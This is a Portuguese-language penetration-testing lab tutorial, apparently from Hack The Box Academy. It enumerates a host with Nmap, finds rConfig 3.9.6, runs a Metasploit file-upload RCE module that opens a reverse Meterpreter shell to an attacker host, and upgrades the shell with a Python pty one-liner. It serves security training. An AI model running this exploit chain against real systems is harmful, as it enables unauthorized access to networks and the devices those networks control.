W3Techs mantém estatísticas contínuas de uso do sistema operacional [estudar](https://w3techs.com/technologies/overview/operating_system). Este estudo relata que `70%` de sites ( servidores ) executados em um sistema baseado em Unix. Para nós, isso significa que podemos nos beneficiar significativamente de continuar a aumentar nosso conhecimento do Unix / Linux e como podemos obter sessões de shell nesses ambientes para potencialmente girar ainda mais dentro de um ambiente. Embora seja comum que as organizações usem terceiros e provedores de nuvem para hospedar seus sites e aplicativos da web, muitas organizações ainda hospedam seus sites e & aplicativos da web em servidores em seus ambientes de rede ( no local ). Nesses casos, gostaríamos de estabelecer uma sessão de shell com o sistema subjacente para tentar girar para outros sistemas na rede interna.

---

## Considerações comuns

Como você já deve ter notado, a obtenção de uma sessão de shell com um sistema pode ser feita de várias maneiras, uma maneira comum é através de uma vulnerabilidade em um aplicativo. Identificaremos uma vulnerabilidade e descobriremos uma exploração que podemos usar para obter um shell fornecendo uma carga útil. Ao considerar como estabeleceremos uma sessão de shell em um sistema Unix / Linux, nos beneficiaremos de considerar o seguinte:

- Que distribuição do Linux o sistema está executando?
- Quais linguagens de shell e programação existem no sistema?
- Em que função o sistema está servindo para o ambiente de rede em que está?
- Qual aplicativo o sistema está hospedando?
- Existem vulnerabilidades conhecidas?

Vamos nos aprofundar nesse conceito atacando um aplicativo vulnerável hospedado em um sistema Linux. Lembre-se das perguntas e faça anotações enquanto passamos por isso. Você pode respondê-las?

---

## Obtendo uma shell através da captura de um aplicativo vulnerável

Como na maioria dos compromissos, começaremos com uma enumeração inicial do sistema usando `Nmap`.

#### Enumerar o host

```shell-session
casluxd@htb[/htb]$ nmap -sC -sV 10.129.201.101

Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-27 09:09 EDT
Nmap scan report for 10.129.201.101
Host is up (0.11s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 2.0.8 or later
22/tcp   open  ssh      OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 2d:b2:23:75:87:57:b9:d2:dc:88:b9:f4:c1:9e:36:2a (RSA)
|   256 c4:88:20:b0:22:2b:66:d0:8e:9d:2f:e5:dd:32:71:b1 (ECDSA)
|_  256 e3:2a:ec:f0:e4:12:fc:da:cf:76:d5:43:17:30:23:27 (ED25519)
80/tcp   open  http     Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34
|_http-title: Did not follow redirect to https://10.129.201.101/
111/tcp  open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
443/tcp  open  ssl/http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2021-09-24T19:29:26
|_Not valid after:  2022-09-24T19:29:26
|_ssl-date: TLS randomness does not represent time
3306/tcp open  mysql    MySQL (unauthorized)
```

Mantendo nosso objetivo de `gaining a shell session` em mente, devemos estabelecer alguns próximos passos depois de examinar nossa saída de digitalização.

`What information could we gather from the output?`

Considerando que podemos ver que o sistema está ouvindo nas portas 80 (`HTTP`), 443 (`HTTPS`), 3306 (`MySQL`) e 21 (`FTP`), pode ser seguro assumir que este é um servidor da web que hospeda um aplicativo da web. Também podemos ver alguns números de versão revelados associados à pilha da web (`Apache 2.4.6` e `PHP 7.2.34` ) e a distribuição do Linux em execução no sistema (`CentOS`). Antes de decidir sobre uma direção para pesquisar mais ( mergulhar em uma toca de coelho ), também devemos tentar navegar para o endereço IP através de um navegador da web para descobrir o aplicativo hospedado, se possível.

#### Ferramenta de gerenciamento rConfig

![imagem](https://academy.hackthebox.com/storage/modules/115/rconfig.png)

Aqui descobrimos uma ferramenta de gerenciamento de configuração de rede chamada [rConfig](https://www.rconfig.com/). Este aplicativo é usado pelos administradores de rede e sistema para automatizar o processo de configuração de dispositivos de rede. Um caso de uso prático seria usar o rConfig para configurar remotamente interfaces de rede com informações de endereçamento IP em vários roteadores simultaneamente. Essa ferramenta economiza tempo dos administradores, mas, se comprometida, pode ser usada para girar em dispositivos críticos de rede que alternam e direcionam pacotes pela rede. Um invasor malicioso pode possuir toda a rede através do rConfig, pois provavelmente terá acesso de administrador a todos os dispositivos de rede usados para configurar. Como pentôsteres, encontrar uma vulnerabilidade nesse aplicativo seria considerado uma descoberta muito crítica.

## Descobrindo uma vulnerabilidade no rConfig

Dê uma olhada na parte inferior da página de login da web e podemos ver o número da versão rConfig (`3.9.6`). Devemos usar essas informações para começar a procurar por qualquer `CVEs`, `publicly available exploits`, e `proof of concepts` (`PoCs`). Ao pesquisar, não deixe de olhar atentamente para o que encontramos e entender o que está fazendo. É claro que queremos que isso nos leve a uma sessão de shell com o alvo.

O uso do seu mecanismo de pesquisa preferido resultará em resultados promissores. Podemos usar as palavras-chave: `rConfig 3.9.6 vulnerability.`

![imagem](https://academy.hackthebox.com/storage/modules/115/rconfigresearch.png)

Podemos ver que vale a pena escolher isso como o foco principal de nossa pesquisa. O mesmo pensamento pode ser aplicado às versões Apache e PHP, mas como o aplicativo está sendo executado na pilha da web, vamos ver se podemos obter um shell através de uma exploração escrita para as vulnerabilidades encontradas no rConfig.

Também podemos usar a funcionalidade de pesquisa do Metasploit para ver se algum módulo de exploração pode nos dar uma sessão de shell no destino.

#### Pesquisar por um módulo de exploração

```shell-session
msf6 > search rconfig

Matching Modules
================

   #  Name                                             Disclosure Date  Rank       Check  Description
   -  ----                                             ---------------  ----       -----  -----------
   0  exploit/multi/http/solr_velocity_rce             2019-10-29       excellent  Yes    Apache Solr Remote Code Execution via Velocity Template
   1  auxiliary/gather/nuuo_cms_file_download          2018-10-11       normal     No     Nuuo Central Management Server Authenticated Arbitrary File Download
   2  exploit/linux/http/rconfig_ajaxarchivefiles_rce  2020-03-11       good       Yes    Rconfig 3.x Chained Remote Code Execution
   3  exploit/unix/webapp/rconfig_install_cmd_exec     2019-10-28       excellent  Yes    rConfig install Command Execution
```

Um detalhe que pode ser esquecido ao confiar em MSF para encontrar um módulo de exploração para um aplicativo específico é a versão de MSF. Pode haver módulos de exploração úteis que não estão instalados em nosso sistema ou simplesmente não estão aparecendo via pesquisa. Nesses casos, é bom saber que o Rapid 7 mantém o código para explorar módulos em seus [repos no github](https://github.com/rapid7/metasploit-framework/tree/master/modules/exploits). Poderíamos fazer uma pesquisa ainda mais específica usando um mecanismo de pesquisa: `rConfig 3.9.6 exploit metasploit github`

Essa pesquisa pode nos indicar o código fonte de um módulo de exploração chamado `rconfig_vendors_auth_file_upload_rce.rb`. Essa exploração pode nos dar uma sessão de shell em uma caixa Linux de destino executando o rConfig 3.9.6. Se essa exploração não apareceu na pesquisa de MSF, podemos copiar o código deste repo em nossa caixa de ataque local e salvá-lo no diretório que nossa instalação local de MSF está referenciando. Para fazer isso, podemos emitir este comando em nossa caixa de ataque:

#### Localizar

```shell-session
casluxd@htb[/htb]$ locate exploits
```

Queremos procurar os diretórios na saída associada ao Metasploit Framework. No Pwnbox, os módulos de exploração Metasploit são mantidos em:

`/usr/share/metasploit-framework/modules/exploits`

Podemos copiar o código em um arquivo e salvá-lo `/usr/share/metasploit-framework/modules/exploits/linux/http` semelhante ao local em que estão armazenando o código no repo GitHub. Também devemos manter o msf atualizado usando os comandos `apt update; apt install metasploit-framework` ou seu gerente de pacotes local. Depois de encontrar o módulo de exploração e baixá-lo (, podemos usar o wget ) ou copiá-lo no diretório apropriado do Github, podemos usá-lo para obter uma sessão de shell no alvo. Se o copiarmos em um arquivo em nosso sistema local, verifique se o arquivo está `.rb` como a extensão. Todos os módulos em MSF são escritos em Ruby.

---

## Usando o rConfig Exploit e ganhando um shell

No msfconsole, podemos carregar manualmente a exploração usando o comando:

#### Selecione um Exploit

```shell-session
msf6 > use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
```

Com essa exploração selecionada, podemos listar as opções, inserir as configurações apropriadas específicas para o nosso ambiente de rede e iniciar a exploração.

Use o que você aprendeu no módulo até agora para preencher as opções associadas à exploração.

#### Executar a exploração

```shell-session
msf6 exploit(linux/http/rconfig_vendors_auth_file_upload_rce) > exploit

[*] Started reverse TCP handler on 10.10.14.111:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] 3.9.6 of rConfig found !
[+] The target appears to be vulnerable. Vulnerable version of rConfig found !
[+] We successfully logged in !
[*] Uploading file 'olxapybdo.php' containing the payload...
[*] Triggering the payload ...
[*] Sending stage (39282 bytes) to 10.129.201.101
[+] Deleted olxapybdo.php
[*] Meterpreter session 1 opened (10.10.14.111:4444 -> 10.129.201.101:38860) at 2021-09-27 13:49:34 -0400

meterpreter > dir
Listing: /home/rconfig/www/images/vendor
========================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  673   fil   2020-09-03 05:49:58 -0400  ajax-loader.gif
100644/rw-r--r--  1027  fil   2020-09-03 05:49:58 -0400  cisco.jpg
100644/rw-r--r--  1017  fil   2020-09-03 05:49:58 -0400  juniper.jpg
```

Podemos ver pelas etapas descritas no processo de exploração que essa exploração:

- Verifica a versão vulnerável do rConfig
- Autentica com o login da web rConfig
- Carrega uma carga útil baseada em PHP para uma conexão de shell reverso
- Exclui a carga útil
- Nos deixa com uma sessão de concha do Meterpreter

#### Interaja com o shell

```shell-session

meterpreter > shell

Process 3958 created.
Channel 0 created.
dir
ajax-loader.gif  cisco.jpg  juniper.jpg
ls
ajax-loader.gif
cisco.jpg
juniper.jpg
```

Podemos cair em um shell do sistema (`shell`) para obter acesso ao sistema de destino como se estivéssemos conectados e abríssemos um console CMD.exe.

## Com um shell TTY com Python

Quando entramos no shell do sistema, notamos que nenhum prompt está presente, mas ainda podemos emitir alguns comandos do sistema. Este é um shell normalmente chamado de `non-tty shell`. Esses shells têm funcionalidade limitada e geralmente podem impedir o uso de comandos essenciais, como `su` (`switch user`) e `sudo` (`super user do`), do qual provavelmente precisaremos se procurarmos aumentar os privilégios. Isso aconteceu porque a carga útil foi executada no destino pelo usuário do apache. Nossa sessão é estabelecida como o usuário do apache. Normalmente, os administradores não estão acessando o sistema como usuário do apache, portanto, não há necessidade de definir um idioma do intérprete de shell nas variáveis de ambiente associadas ao apache.

Podemos gerar manualmente um shell TTY usando Python se ele estiver presente no sistema. Sempre podemos verificar a presença do Python nos sistemas Linux digitando o comando: `which python`. Para gerar a sessão do shell TTY usando Python, digitamos o seguinte comando:

#### Python interativo

  Python interativo

```shell-session
python -c 'import pty; pty.spawn("/bin/sh")' 

sh-4.2$         
sh-4.2$ whoami
whoami
apache
```

Este comando usa python para importar o [módulo pty](https://docs.python.org/3/library/pty.html), então usa o `pty.spawn` função para executar o `bourne shell binary` (`/bin/sh`). Agora temos um prompt (`sh-4.2$`) e acesso a mais comandos do sistema para mover o sistema como quisermos.